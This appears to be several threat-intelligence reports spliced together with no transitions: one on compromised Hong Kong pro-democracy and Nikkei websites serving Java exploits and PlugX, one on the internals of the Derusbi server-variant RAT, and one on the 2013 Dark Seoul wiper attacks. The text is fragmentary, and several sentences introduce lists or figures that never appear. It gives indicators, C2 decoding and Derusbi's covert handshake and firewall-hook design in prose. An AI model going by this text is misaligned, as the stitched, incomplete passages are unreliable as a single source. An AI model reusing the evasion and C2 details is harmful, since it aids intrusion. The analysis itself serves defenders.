During our research for this post , we also became aware of multiple public reports related to the compromise of the DPHK website on both Twitter and via ThreatConnect .
Our good friend Claudio Giurianeri posted the following tweet on October 3 , 2014 The website of the Democratic Party of Hong Kong has been compromised and still is .
Let them know .
In particular , a tweet from Brandon Dixon with relevant data from the PassiveTotal project details several subdomains and IP addresses associated with java-se.com .
While Volexity has only observed a handful of the hostnames in the wild thus far , other active subdomains suggest there could be additional on - going exploit or malware activity from the domain .
Additional reporting on this activity and another going back to August 2014 was also recently shared on ThreatConnect .
Despite all of this attention , the DPHK website is still compromised and references the JavaScript from the hostile domain .
It is also worth noting that this is not the first time that the DPHK website has been used in a strategic web compromise .
Back in May 2011 , Kaspersky Lab reported the website was being leveraged to target users with Flash Exploits .
The DPHK appears to be of high value with respect to targeting visitors .
During the course of investigating activity related to the ATD and DPHK websites , Volexity also observed that the website of the political coalition and pan - democratic organization People Power in Hong Kong ( www.peoplepower.hk ) had been compromised as well .
However , unlike the other two websites , the People Power website did not contain JavaScript modifications pointing to java- se.com .
Instead the website appears to have malicious iFrames leveraging the Chinese URL shortener 985.so .
At the bottom of several of the pages for the People Power website are four iFrames as seen in this screen shot of the website source : Those links , with the exception of the first one , all redirect to exploit pages on the Hong Kong IP address 58.64.178.77 .
These pages load scripts that conduct profiling of the system for various software , plugins , and other related information , as well as load Java exploits designed to install malware on the target system .
If successful , the exploits will install either a 32-bit or 64-bit version of the malware .
Both files are found within the Java Archives files .
Below are details on each of the malware files .
Filename : main.dll File size : 13824 bytes MD5 hash : 1befa2c2d1bfc8e87d52871c868f75fe SHA1 hash : 8f81bb0bfa6b3ebf3ef4ea283b23a5ccae5b6817 Notes : 32-bit version of malware , which beacons to 58.64.178.77:443 .
Filename : main64.dll File size : 15872 bytes MD5 hash : a482a84d13c76b950ce5bc7e75f4edef SHA1 hash : c0a4b9145e0066f5c1534beddc9c666ea8eb0882 Notes : 64-bit version of malware , which beacons to 58.64.178.77:443 .
At the time of this writing , the People Power website is still serving up malicious code .
Volexity recommends avoiding this website and/or browsing with caution .
Volexity believes a separate group of attackers is responsible for this exploit activity and that they are not affiliated with the java-se.com operations .
While digging deeper into pro - democratic websites in Hong Kong , Volexity also discovered peculiar code on the website of a pro- democratic and pro - universal suffrage public policy think thank The Professional Commons ( www.procommons.org.hk ) .
In the case of this website , there is suspicious JavaScript code that writes an iFrame pointing back to a non - existent HTML page on a hotel website in South Korea .
The code from the website can be seen in the screen shot below .
The URL in question points to : hXXp : //www.hotel365.co.kr / Lnk / tw / index.html This link does not work and will redirect a visitor back to the main page of the website .
There does not appear to be any reason for the Professional Commmons website to have a hidden iFrame link randomly placed in the middle of its HTML code .
It is suspected that this was a formerly active exploit URL .
If it is actually malicious , it is possible the code could be re - activated at any time .
Volexity recommend the URL and the Professional Commons website be browsed with caution .
In early September , the APT group behind java-se.com raised its visibility on Volexityâ€™s radar following a compromise that effectively impacted many components of the Japanese Nikkei .
In the first week of September , a subdomain used to load JavaScript code and additional files onto other Nikkei web properties such as www.nikkei.com and asia.nikkei.com was compromised .
In particular a JavaScript file loaded from parts.nikkei.com was modified to reference another JavaScript file from jre76.java-se.com hosted on the Japanese IP address 211.125.81.203 .
The code has since been taken down .
However , in early September the JavaScript was pre - pended to the file http : //parts.nikkei.com / parts / SC / s_cDS.js as seen in the screen shot below .
Like the JavaScript from the ATD and DPHK websites , Volexity was never actually able to obtain a live copy of this script .
Each request results in an HTTP 403 response from the server .
Volexity suspects the code was either active at select times and/or was only served to a subset of visitors .
The code has not been observed on the s_cDS.js file for nearly a month now .
While tracking this APT activity , Volexity has also come across other seemingly unrelated compromises of websites in Hong Kong and Japan associated with the java-se.com activity .
Despite several sites being compromised , the above activity tied to java-se.com did not result in the successful capture of actual exploit code or malware .
However , research into other websites and activity involving java-se.com did lead Volexity to live exploits and malware .
In particular Volexity came across live exploit code hosted at jdk-7u12-windows-i586.java-se.com on the Japanese IP address 210.253.96.200 .
This system hosted a JavaScript file , which in turned loads a malicious Java Applet .
In testing the the Java Applet pops up a notification to the user asking them if they want to run the applet .
Volexity has not had enough time to thoroughly analyze the file to see if it is an actual exploit or if the attackers rely on user assisted malware installation .
The pop - up does make it appear as if the file is an update to Java .
The popup displayed by Java is displayed below .
As can be seen in the image above , this popup could be misconstrued by a user as an update to Java despite the java-se.com domain and the Publisher being listed as WindySoft .
Interestingly the Java Archive being loaded is digitally signed by a certificate issued to WindySoft , an online gaming company from South Korea .
We can not confirm this certificate actually belonged to WindySoft at any point in time , however , there is fairly established precedent of certificates from online gaming companies being used to digitally sign malware and attack tools .
As one might expect , choosing to press the Run button would be bad news for someone presented with this prompt .
If one were to click Run from this prompt , it would result in the file css.jpg being download over an encrypted channel from a folder on https : //elsa - jp.jp .
Note that elsa-jp.jp is a website hosted on the same IP address jdk-7u12-windows-i586.java-se.com and is likely compromised .
The file css.jpg is of course not a JPEG file , it is an executable that has been encoded with the single - byte XOR key 0xFF .
Filename : css.jpg File size : 168776 bytes MD5 hash : b3a9e6548fb3cc511096af4d68b2e745 SHA1 hash : 394703d1240ccd3aaeeef50c212313e3036741b1 Notes : Executable file downloaded by Java Applet that has been encoded with XOR 0Ã-99 Taking a closer look at the resulting executable we have , it turns out it is a newer sample of PlugX .
In this particular sample an interesting and notable string was observed : C : \wocawocawoca\piao\Release\caca.pdb Also of interest is that as observed from the Java Applet , the executable is also digitally signed by a certificate issued to â € œWindySoft.â€​ Upon execution the malware sample immediately does a DNS resolution for the following hostname : jduhf873jdu7.blog.163.com The PlugX sample connects to the blog and parses the page for a command for where to connect to next .
This is very similar to the method described by FireEye in their blog on Operation Poisoned Hurricane .
The primary difference being that the attackers opted to use a 163.com Blog over a Google Code page to embed the command .
Taking a closer look at the Blog page the following post is observed : The primary string to focus on is in the title of the post : DZKSCAAAAJPBBDHDDDOCCDFDFDOCCDBDHDOCHDHDDZJS Using the same decoding routine describe by Cassidian in a PlugX post of theirs from earlier this year , we can see this command decodes to instruct the malware to connect to a U.S .- based Linode IP address at Hurricane Electric : 173.255.217.77 .
The ones that still resolve to the IP are listed below : dns.apasms.com ns.gpass1.org ns1.gpass1.org These hostnames may be related but at the time of this writing we have not seen them in use in malware and are unable to confirm .
As we have seen for several years now , dissenting groups , especially those seeking increased levels of freedom frequently find themselves targeted for surveillance and information extraction .
In the digital age , a strategic web compromise ( exploit drive - by ) has become a key weapon of choice for to conduct such operations .
These types of attacks are far from overt , as a typical target and victim opted to go on their own to what they believe should be a safe and trusted website .
In the case of this post , it appears that at least two different attackers were involved in compromising and placing malicious code on Pro - Democratic websites in Hong Kong .
This is not the first time and surely will not be the last time that those in favor of democracy in Hong Kong will be targeted .
Unfortunately with the level of access and infrastructure the attackers appear to have , this is quite an uphill battle .
Continuing to expose these attack is one means that shines light on these attack operations with an aim at putting a dent in their success .
There are two types of Derusbi malware : a client - server model and a server - client model .
Both types provide basic RAT functionality with the distinction between the two being largely the directionality of the communication .
This report will focus on the server - client variant ( or simply , the `` server variant '' ) of Derusbi , which acts as a server on a victim 's machine and waits for commands from a controlling client .
In and of itself , the Derusbi server variant is a largely unremarkable RAT when viewed from the perspective of functional capabilities .
The server variant supports basic RAT functionality such as file management ( uploading and downloading ) , network tunneling and remote command shell .
What makes the server variant interesting is the device driver that the variant installs .
The server variant utilizes a device driver in order to hook into the Windows firewall by either using largely undocumented Windows Firewall hooking techniques found in Windows XP and older or by using the documented Windows Filtering Platform found in Windows Vista and later .
The driver , after hooking the firewall using either of the two mentioned interfaces , will inspect incoming network packets .
If a specific handshake occurs between the client and the server variant , the remainder of the communication session for the established session will be redirected to the server variant .
If the driver does not detect the appropriate handshake , then the network traffic is allowed to pass unobstructed .
This allows an attacker to hide their communication within a cluster of network sessions originating from a single IP such as would be the case for a client performing multiple HTTP requests against a web server .
The server variant runs as a svchost dependent service .
While the server variant binary does have exports related to the standard service DLL ( e.g .
When loaded into memory via a LoadLibrary or equivalent function call , the server variant will determine the name of the host binary ( presumably svchost.exe ) as well as its own DLL 's name .
The binary then spawns a new thread that contains the main server variant code in order to allow the DllEntryPoint routine to return to the calling function .
Within the main server variant function ( dubbed mainThread ) , the server variant loads a pointer to the API function GetCommandLineW , locates the pointer in memory to the command line string , and then locates the first space within the command line string and terminates the string by placing a NULL character at the location .
The server variant then attempts to determine if it has suitable access rights within the system in order to operation .
The check for access rights effectively checks to see if the server variant process is running under the NT Authority .
If the check is unsuccessful , then the server variant terminates .
With the command line patched and authority verified , the server variant sleeps for 5 seconds before verifying that the fShutdown flag is not set .
The fShutdown flag can become set by the process loading the server variant calling the DllRegisterServer export .
The DllRegisterServer function , among other tasks , will attempt to install the server variant as a server on the victim 's machine .
Therefore , by waiting 5 seconds before continuing the mainThread functionality , the server variant is giving the DllRegisterServer time to activate and perform the necessary operations to ensure that the server variant is properly installed and activated as a service .
The mainThread calls the mainLoop function of the server variant .
The mainLoop function begins by loading the unique infection ID for the victim 's machine from the registry ( under the key value located at HKLM\SOFTWARE\Microsoft\Rpc\Security ) .
The infection ID , if present , must be decoded by XOR'ing each byte of the string with a static byte value ( typically 0x5F ) .
If the infection ID does not exist within the registry , the server variant will attempt to load the configuration from an encoded buffer located immediately after the static string XXXXXXXXXXXXXXX , decode the buffer by starting at the last byte and XORing each previous byte by the current byte value in reverse order ; the server variant will then use a specific portion of the configuration blob as the infection ID 's base .
Next , the server variant will append a hyphen and a four digit value to the end of the infection ID to generate the unique infection ID for the victim 's machine .
The newly generated infection ID is then saved to the registry location stated previously .
The mainLoop attempts to get the privileges for SeDebugPrivilege , SeLoadDriverPrivilege , SeShutdownPrivilege , and SeTcbPrivilege in order to perform the necessary operations to load the driver portion of the server variant .
The mainLoop will attempt to open a handle to the driver ( if it is already installed ) by calling CreateFile with the filename of \Device\ { 93144EB0 - 8E3E-4591-B307 - 8EEBFE7DB28F } .
Failing this , the mainLoop determines if the victim 's machine is running the 360 antivirus product by looking for a process with the name ZhuDongFangYu.exe .
If the process is running , the driver is not installed but the mainLoop continues regardless .
If the process is not found , however , the mainLoop will extract the driver binary from an encoded buffer within itself , decode the file in memory ( using a rotating 4-byte XOR key ) , and install the driver on the victim 's machine as % SYSDIR % \Drivers\ { 93144EB0 - 8E3E-4591-B307 - 8EEBFE7DB28F } .sys
With the driver present ( or recently installed ) , the mainLoop spawns another thread ( dubbed DerusbiThread : : DerusbiThread ) that acts as the primary communication loop .
The prototype for PCC_SOCK appears in Figure 1 .
With a new PCC_SOCK object allocates , DerusbiThread : : DerusbiThread selects a port between 40,000 and 45,000 to use as a listening port .
The port number is sent to the driver ( via IOCTL 0x220200 ) in order to inform the driver where to redirect incoming traffic .
The `` Windows Device Driver ( Firewall Hook ) '' section explains the functionality of the driver in greater detail .
At this point DerusbiThread : : DerusbiThread enters an infinite loop of waiting for new connections to the listening socket and dispatching a new thread ( dubbed CommLoop ) to handle the traffic for the socket until fShutdown is set .
At this point , the startup sequence for Derusbi is complete and the server variant moves into a communication and command dispatch phase .
The communication between the controlling client and the Derusbi server variant depends on the device driver being in place .
The authors of the device driver designed the driver to work on Windows 2000 and later versions of the Windows operating system .
Depending on the version of the victim 's OS , the driver will hook the Windows Firewall by either using the surprisingly undocumented IOCTL_IP_SET_FIREWALL_HOOK command of the \\Device\IP device for Windows XP or older machines or by using the documented Windows Filtering Platform ( WFP ) found in Windows Vista and later .
The device driver inspects incoming network traffic from any client connecting to the victim machine , determines if an appropriate handshake packet occurs at the beginning of a new TCP session , and then makes the decision to reroute the network traffic to the Derusbi malware or let the traffic continue unaltered to its original service .
Once a session has been established by means of a valid handshake , any subsequent packets from the client for the given TCP session will automatically be directed by the device driver to the Derusbi server variant .
The device driver does not capture or store any network traffic outside of the initial handshake inspection .
The Derusbi server variant will select an available , random port between the range of 40,000 and 45,000 on the victim 's machine upon which to listen .
After selecting the port , the server variant will wait for incoming connections and instruct the driver to redirect appropriate TCP sessions to the listening port .
In order to establish a valid communication channel between the server variant and a controlling client , a specific handshake is required .
The handshake between a client and the server variant is well defined and consisting of 64 bytes , the data within the handshake is entirely random with the exception of the 3rd and 8th DWORD .
The handshake begins when the client sends a 64 byte random buffer with the 3rd ( offset 12 ) and 8th ( offset 32 ) DWORDs defined as : The server will acknowledge the handshake by sending a 64 byte random buffer with the same pattern for the 3rd and 8th DWORDs based on the new , randomly generated 1st DWORD ( offset 0 ) .
It is the client 's handshake that the driver for the server variant triggers off of .
Some older versions of the server variant use a different set of DWORDs to validate the handshake , also the tests are the same .
These other versions have been observed to use the following DWORDs : If the handshake fails , the server variant provides a secondary means to authenticate a client .
Presumably a failsafe if the driver is unable to load , the secondary method requires the client to send a POST request with the following form : POST /forum / login.cgi HTTP/1.1\r\n In addition , the POST request must contain a Via field .
If the request and the Via field exist , the server variant authenticates the client and responds with HTTP/1.0 200 Server : Apache/2.2.3 ( Red Hat ) Accept - Ranges : bytes Content - Type : text / html Proxy - Connection : keep - alive If the client 's request does not meet the appropriate authentication criteria , the server variant sends : HTTP/1.0 400 Bad Request Server : Apache/2.2.3 ( Red Hat ) Connection : close With a communication channel between the server variant and the client established , the server sends information about the victim 's computer .
Consisting of a 180 byte data structure ( Figure 3 ) , the server variant provides the client with a variety of details about the victim 's machine .
The VictimInfoPacket has an identifier of 2 ( see the dwPktType explanation below ) .
The communication between the server and the client at this point , and for the remainder of the session , is encrypted .
Communication between the client and the server variant exists in the form of a sequence of encrypted datagrams .
Each datagram consists of a 24 byte header followed by an optional payload section .
The header is not encrypted but if the optional payload is attached , the payload is encrypted using a DWORD XOR .
The format of the header is as follows : The dwTotalPacketSize field defines the total size of the datagram including both the size of the header and the size of the optional payload .
The dwPktType field correlates to the module ID which allows the server variant to route the datagram to the appropriate module without further inspection of the payload data .
The dwChecksum value is sum of all of the bytes within the optional header ( the field is ignored , but present , if there is no payload section ) .
The dwEncryptionKey is the 32-bit XOR encryption key for the payload section .
If the fCompressedPayload field is non - zero , then the data within the payload is compressed using LZO compression ( prior to XOR encoding ) and the dwDecompressedSize field represents the final size of the payload data after decompression .
The payload section can have up to three different presentations depending on if compression is used .
The first presentation is the original payload data as generated by the client or server , the second presentation is the LZO compressed form , and the final presentation ( the presentation that exists going across the network ) is the 32-bit XOR encoded data blob .
Figure 4 provides a graphical representation of the presentation types of the payload section .
After sending the server information via the VictimInfoPacket , the server variant spins off a CommLoop thread for the connection and returns to waiting for new connections from clients to appear .
The CommLoop thread begins by establishing the set of internal command handlers available to the server variant .
With the exception of the administrative command handler ( which is built into the CommLoop ) , each of the internal commands consists of an object derived from a base object PCC_BASEMOD .
The server variant appears to have a modular design allowing an attacker to compile only the components that are necessary for any given operation .
The malware supports up to 8 different modules per sample with each module designating its own ID code .
Novetta has observed the following modules : Given the spacing in ID numbers ( as noted in the gap between 0x82 and 0x84 in an otherwise sequential ID scheme ) , it is conceivable that additional modules exist .
After establishing the tools , an infinite loop ( CommLoop ) is entered in which the server variant will wait for up to 1/100 of a second for input from the network ; if such input arrives , the server routes the packet to the appropriate handler .
If the network input does not arrive , the CommLoop queries each of the command handlers for any packets they may have queued ( by calling each command handler 's ReadWaitingData function ) and transmits the packets the handlers have generated .
Additionally , if more than 60 seconds passes between network inputs from the client or network outputs from the server variant , the CommLoop will send out a beacon packet ( dwPktType = 4 ) .
When the appropriate command handler is found , CommLoop passes the payload of portion of the packet to the command handler 's ProcessPacket function .
The PCC_CMD object contains the remote shell functionality of the server variant along with the ability to execute arbitrary programs .
Derived from the PCC_BASEMOD class , the PCC_CMD class 's operations are focused largely in the ProcessPacket and ReadWaitingData functions .
The PCC_CMD : : ProcessPacket function works as a stub function that merely passes the packet 's payload data ( pkt ) data to PCC_CMD : : ProcessPacketEx while ignoring the dwPktSize parameter .
The packet 's payload data is , in and of itself , another datagram with a header and optional payload section .
The payload of each PCC_CMD destined packet contains the following header : The dwCommandType field specifies the specific PCC_CMD command that the client is requesting the server variant perform .
There are four commands that PCC_CMD supports : For each of the commands , any output from or acknowledgement of the commands comes in the form of another packet consisting of a PacketHeader followed by a PCCCMDPacketHeader and any optional payload data .
The dwCommandType of the newly constructed packet matches the command 's original dwCommandType value ( e.g .
The PCC_CMD : : ReadWaitingData member function is responsible for transmitting any of the previously queued packets from PCC_CMD : : ProcessPacketEx .
If there are no queued packets , PCC_CMD : : ReadWaitingData will perform a queue of the console output pipe for the remote shell process ( if it is active ) ; the function will also attempt to read the entirety of the waiting data , which then becomes the payload of a PacketHeader / PCCCMDPacketHeader based packet with the dwCommandType set to 0x0C .
If the read is unsuccessful , the function returns a PacketHeader / PCCCMDPacketHeader based packet with the dwCommandType set to 0x10 indicating an error and terminating the remote shell session .
The PCC_FILE object provides a large range of file system administration functions .
This is not necessarily the case , however .
The PCC_FILE : : ProcessPacket member function , much like PCC_CMD : : ProcessPacket , is little more than a stub function that passes only a copy of the payload data ( pkt ) to PCC_FILE : : ProcessPacketEx .
The PCC_FILE : : ReadWaitingData member function is a stub function that calls PCC_FILE : : ProcessQueue and returns the resulting packet from the queue processing .
This means that file operations are surprisingly low priority , and potentially , high latency operations .
Each packet that arrives within the packet queue of PCC_FILE contains a standard header followed by a ( quasi - optional ) payload data blob .
The header for the PCC_FILE command packets takes the following form : The dwCommandType field specifies the specific PCC_FILE command that the client is requesting the server variant to perform .
While the general form within the Derusbi server variant communication model is to return a packet with the same dwCommandType as the original command , many of the PCC_FILE commands return a status packet type ( dwCommandType = 0x04 ) .
Commands 0x2C , 0x44 , and 0x48 all appear to be the exact same base command with only slight variations in their response format .
It is unclear why this particular command is included three times in PCC_FILE .
The PCC_PROXY object provides the platform for a tunneling network traffic to and from the client to a specific endpoint ( or endpoints if multiple tunnels are activated by the client ) .
Derived on the PCC_BASEMOD class , the PCC_PROXY class performs very little network tunneling within the CommLoop interactive PCC_PROXY : : ProcessPacket and PCC_PROXY : : ReadWaitingData member functions .
The PCC_PROXY : : ProcessPacket member function queues incoming PCC_PROXY packets into a received queue while PCC_PROXY : : ReadWaitingData returns packets from a transmit queue , with the directionality from the perspective of the server variant .
The core of the PCC_PROXY 's network tunneling comes from a spawned processing thread ( PCC_PROXY : : MainThread ) that is generated when the PCC_PROXY object is instantiated .
The PCC_PROXY : : MainThread function consist an infinite loop that only terminates when the PCC_PROXY : : fShutdown flag is set .
Otherwise , the loop will inspect another internal flag ( PCC_PROXY : : fNetworkEnabled ) to determine if the network tunneling is currently active .
If the PCC_PROXY : : fNetworkEnabled flag is set to false , then tunneling is disabled but command processing continues .
It is possible to have more than one tunnel active at any given time .
In order to firewall tunnels from each other over the backbone of the server variant 's command channel , each tunnel is assigned a specific channel identifier .
This allows the client to specify which specific tunnel data is transmitted to as well as telling the client which tunnel is returning data .
If the PCC_PROXY : : fNetworkEnabled flag is set to true , PRC_PROXY : : MainThread will loop through all active channels , perform a select on the socket connected to the endpoint and -- if the select indicates that there is data waiting on a particular socket -- the data is read .
A new PCC_PROXY based packet is then generated and the packet is queued for delivery to the client .
After processing each of the channels for new data , PCC_PROXY : : MainThread processes incoming command packets from the client ( an operation usually handled by the PCC_BASEMOD : : ProcessPacket function ) .
Packets belonging to the PCC_PROXY subsystem have a common header , much like the other PCC_BASEMOD derived classes .
To this end , the PCC_PROXY packets have the same packet header as the PCCFilePacketHeader packet header .
The PCC_PROXY supports five commands : The administrative commands are built - in to the server variant and are not derived from the PCC_BASEMOD class .
Each of the administrative command packets contains the same header structure as the PCCFilePacketHeader structure followed by an optional payload data blob .
The administrative commands consist of the following five commands : Given the encrypted , and potentially compressed , nature of Derusbi server variant network traffic , detecting the traffic on a network can be problematic using traditional IDS signatures .
South Korea was hit by a major cyberattack on March 20 , 2013 , at 2:00 pm local time .
This cyberattack caused a significant amount of damage to the affected organizations by wiping the hard drives of tens of thousands of computers .
Though not definitive , our analysis provides a much clearer picture .
The research also indicates that there may have been two distinct groups , attacking different targets .
Our analysis of this attack - known first as Dark Seoul and now as Operation Troy - has revealed that in addition to the data losses of the MBR wiping , the incident was more than cybervandalism .
The attacks on South Korean targets were actually the conclusion of a covert espionage campaign .
Our analysis suggests the following order of these attacks .
Later in this report we mention other elements that color our view of this event , but consistent throughout is our belief that the attackers had access to the environments prior to launching the wiping component .
March 20 attack against banks and news agencies in South Korea : 1 .
The remote - access Trojan was compiled January 26 , 2013 .
The component to wipe the master boot record ( MBR ) of numerous systems was compiled January 31 .
An initial victim within the organization was spear - phished with the remote - access Trojan .
This likely occurred before March 20 , and possibly weeks prior to the attack .
The dropper was compiled March 20 , hours before the attack occurred .
The dropper was distributed to systems across the victim organizations , and within minutes of execution the MBRs were wiped .
This occurred around 2:00 pm Seoul time on March 20 . Who conducted these attacks is still unclear , but our research gives some further insight into the likely source .
The clues left behind confirm that the two groups claiming responsibility were a fabrication to throw investigators off the trail and to mask the true source .
The two groups that appear to have been involved in the attacks have had no prior connection until now .
The samples connected to this group are more convincing .
The majority of the wipers ( found in the wild and retrieved from infected systems through other sources ) contain the strings `` principes '' and `` hastati , '' which also appear in a message left on one of the targeted websites in the form of a web pop - up .
The wiper component also overwrote the MBR with one of these strings .
The following data points support this fact : ––The strings `` principes '' and `` hastati '' were found within the code of some of the wiper components .
The same strings were also found in the web pop - up message that was left on the Nocut News Korea website .
The strings are ancient Roman terms that make reference to military units , hence a `` cyberarmy .
––The remote - access Trojan that was found had a build path which included the reference `` Make Troy , '' a subdirectory of the folder `` Work .
On March 20 , the website of the network provider LG + U was defaced by this group .
Was it a coincidence that a second group was involved ? All of the evidence indicates that they had a strong involvement , but there is no solid link to the group because it did not claim involvement in the attacks .
However , we do have the circumstantial link of a wiper component that in practice operated differently from the wipers employed by the NewRomanic Cyber Army yet also appears to be essentially the same wiper .
The Whois Hacking Team MBR wiper component includes the same graphics ( in a resource file in the binary ) that appeared on the defaced LG + U website , although the malware did not behave the same way .
Within the main executable file , however , we discovered a small portion of the code that matched the structure of that of the NewRomanic Cyber Army wipers we found , so the Whois Team likely dropped the same wiper .
State sponsored or not , these attacks were crippling nonetheless .
The overall tactics were not that sophisticated in comparison to what we have seen before .
The trend seems to be moving toward using the following techniques against targets : • Stealing and holding data hostage and announcing the theft .
Public news media have reported only that tens of thousands of computers had their MBRs wiped by the malware .
But there is more to this story : The main group behind the attack claims that a vast amount of personal information has been stolen .
This type of tactic is consistent with Anonymous operations and others that fall within the hacktivist category , in which they announce and leak portions of confidential information .
This was n't the first time that this type of attack - in which destructive malware wiped the systems belonging to a financial institution - has occurred in South Korea .
In 2011 the same financial institution was hit with destructive malware that caused a denial of service .
The attackers left a calling card a day after the attacks in the form of a web pop - up message claiming that the NewRomanic Cyber Army Team was responsible and had leaked private information from several banks and media companies .
They also referenced destroying the data on a large number of machines ( the MBR wiping ) and left a message in the web pop - up identifying the group behind the attacks .
The page title in Internet Explorer was `` Hey , Everybody in Korea ? ? ? ? '' `` Hi , Dear Friends , We are very happy to inform you the following news .
We , NewRomanic Cyber Army Team , verified our # OPFuckKorea2003 .
We have now a great deal of personal information in our hands .
Those includes ; 2.49 M of member table data , cms_info more than 50 M from .
Much information from Bank .
We destroyed more than 0.18 M of PCs .
Many auth Hope you are lucky .
Part of PRINCIPES Elements .
Please also visit pastebin.com .
Each variant had a particular use .
Some public reports mentioned only the use of the wiper component ; however , there were actually three components , all with a different purpose , that assisted the attackers in the campaign .
There were two subsequent aspects to this attack : • The destruction of PCs using the MBR wiper component .
Occurred March 20 .
The duration of this access is unknown .
The dropper Trojan was primarily used to download the executable that destroyed the systems ' MBRs .
We suspect that the dropper Trojan was distributed at the time of the attacks via a compromised patch - management server that pretended to run a legitimate update .
The dropper Trojan was compiled March 20 , the day of the attack and several hours prior to the destruction of the systems .
We suspect that the attackers had access to the target environment prior to March 20 .
It is unlikely that a large volume of users ( some 30,000 + ) were spear - phished on March 20 alone .
It 's likely a much earlier compromise led to the attacks ' being staged internally .
Thus , there was an initial victim whose infected system allowed the attackers to gain access to other systems that let them distribute the malware broadly .
The initial infection certainly could have come from a spear - phishing attack .
The backdoor component was compiled in late January .
The attackers could have been inside the networks since February .
This timeline is plausible given that the attackers claim to have stolen a vast amount of information from these networks prior to wiping the MBRs .
Our further analysis led us to discover additional components that support our conclusion : • A remote - access Trojan was discovered to have compromised some of the target environments , specifically an internal server used to distribute updates to thousands of PCs .
This Trojan variant was compiled January 26 , and was detected by the security industry on March 25 .
This Trojan was built with the Microsoft Visual C++ Version 2.9 compiler with a file size of 47 KB .
We have seen several wiper samples to date ; all were compiled January 31 .
The wiper itself is relatively small ( 24 KB ) and is introduced into the environment via a dropper Trojan that is 418 KB and was compiled the day of the attacks .
Upon executing the malware , the main dropper ( 9263e40d9823aecf9388b64de34eae54 ) creates the file AgentBase.exe , the MBR wiper component .
This file is placed in the infected user 's application data folder , executes , and immediately starts the countdown to wipe the system and render it unbootable .
This file was compiled approximately two months prior to the attack 's taking place .
The main dropper component was compiled the day of the attack , March 20 , at 4:07 am Seoul time .
The dropper installed the wiper , which destroyed the MBRs at around 2:00 pm Seoul time .
Once the dropper executed , the system were wiped within minutes .
Thus , these components likely were n't distributed until the time when the attackers wished to destroy these machines .
It 's not widely known that the attackers used a remote - access Trojan to compromise an internal server .
The attackers used this internal server to distribute the wiper component to the thousands of PCs .
The remote - access Trojan had a file size of 46 KB and was compiled on January 26 , five days before the MBR wiper was compiled .
As we concluded earlier , we have determined that the attackers had access to the environment prior to wiping the systems .
The remote - access Trojan was likely delivered to an internal PC via a spear - phishing campaign .
From this system the attackers accessed other internal resources .
The Trojan was designed to operate within Internet Explorer ; it launched a hidden instance of Internet Explorer and injected itself into the running process .
The Trojan immediately modified the properties in the registry to allow for remote connections to the system .
Linking malware to its developers is n't always an easy task .
Most attackers are careful enough to ensure they ca n't be traced .
This is especially important in cases such as cyberespionage , in which the intent is to remain invisible .
In our analysis we observed a number of unique attributes in the components involved in these attacks ; these markers allowed us to link specific samples to a specific group .
Two groups have taken credit for these attacks , but we can tell that the variants which wiped the systems link to the NewRomanic Cyber Army Team .
Although the Whois Hacking Team is more public due to its defacement of the network provider LG + U 's website , we can link this group to only one sample of a wiper , which operates differently than the others .
The Whois wiper is much larger , with a file size of 236 KB and was compiled March 19 , whereas the other wiper components are a mere 24 KB .
The larger size suggests the Whois wiper contains more functions .
Thus , we can definitively link NewRomanic to the samples used to wipe the MBRs of systems within the South Korean financial institution networks .
Confirming the link between NewRomanic and known wiper samples , we found a number of wiper samples contained either the string `` hastati '' or `` principes '' in the calling cards left by the attacker .
Not only did most of the wiper samples link to NewRomanic , but the remote - access Trojan can also be linked to the group .
The Trojan contained a build path that mentions Troy in the directory path , again consistent with the ancient Roman references used by this group .
It is highly unusual that two groups claim responsibility for these attacks .
No further information has been revealed as to who they are or what their motivations are ; this is another reason to suspect that these two groups are the same and are actually fabricated .
The supporting evidence comes in the form of code analysis determining the degree of similarity between the samples .
The Whois Hacking Team sample was compiled March 19 at 1:57 pm local time and the NewRomanic dropper was compiled March 20 at 4:07 am local time .
The attacks on South Korean banks and media and the defacement of LG + U occurred approximately 2:00 pm local time on March 20 .
In spite of the fact that the wiper component originating from NewRomanic Cyber Army Team was 24 KB in size and the component from Whois was 236 KB , we did find similarities within the code .
The Whois sample is a dropper for a component that closely resembles the one used by the NewRomanic Cyber Army .
We found a significant number of matching subroutines and a large number of code segments with only minor differences .
These similarities lead us to conclude that the payload code is based upon the same initial code and was embedded into different droppers .
Public reports covering what is known as the Dark Seoul incident , which occurred on March 20 , 2013 , addressed only the MBR wiper components .
Many of the details of this incident have been examined , and most analysts conclude this was an isolated , though clearly coordinated , attack .
However , McAfee Labs has found that there was more to the incident than what was widely reported .
Our analysis has revealed a covert espionage campaign .
Typically this sort of advanced persistent threat ( APT ) campaign has targeted a number of sectors in various countries , but Operation Troy , as these attacks are now called , targets solely South Korea .
From our analysis of unique attributes within the malware samples we have determined that the initial code behind the `` Troy '' family of Trojans was created in 2010 , as was another component that was dropped by the Trojan HTTP Troy .
The malware used in these attacks were compiled to specifically target South Korea and used Korean - language resources in the binaries .
The malware connected to legitimate Korean domains that were running a bulletin board and sent a specific command to a PHP page to establish an IRC channel and receive commands .
This spying operation had remained hidden and only now has been discovered through diligent research and collaboration .
We also suspect the attackers had knowledge of the security software running within the environment before they wiped the systems , given that some of the variants used in the attack were made to look as if they were antimalware update files from before March 20 .
The attackers who conducted the operation remained hidden for a number of years prior to the March 20 incident by using a variety of custom tools .
Our investigation into Dark Seoul has found a long - term domestic spying operation underway since at least 2009 .
The operation , all based on the same code , has attempted to infiltrate specific South Korean targets .
We call this Operation Troy , based on the frequent use of the word Troy in the compile path strings in the malware .
The prime suspect group in these attacks is the New Romanic Cyber Army Team , which makes frequent use of Roman and classical terms in their code .
While analyzing malware components from before the March 20 incident we found both similar and identical attributes of the files involved that enable us to link them to the 3Rat remote administration tool client used on March 20 as well as to samples dating to 2010 .
Furthermore , we determined that through prior access to the victims ' networks , the attackers were able to upload the MBR wiper component and distribute it .
It is also possible that the campaign known as 10 Days of Rain is a byproduct of Operation Troy ; some of our analysis suggests that the malware Concealment Troy was present in these attacks .
This Trojan is based upon malware created for a military espionage campaign that first emerged in 2009 .
It included a shared DLL ( bs.dll ) that was found in the 2010 and 2011 variants .
Later variants use a modified version , HTTPSecurityProvider.dll , which employs nearly the same file - mapping function as used by bs.dll .
Most of these variants are compiled from the Work directory ; that 's fairly consistent throughout all versions .
The DLL was compiled using Microsoft Visual C++ Version 6 .
Those iterations were found in 2010 - 2011 .
The call graph generated for NSTAR 's bs.dll is identical with that of HTTP Troy .
They were compiled at least a year apart from each other .
The DLL was compiled March 3 , 2011 , and includes an OCX component that was compiled in late 2010 .
The OCX used a very different compile path , but bs.dll , the backdoor , is essentially the same as those seen in later versions .
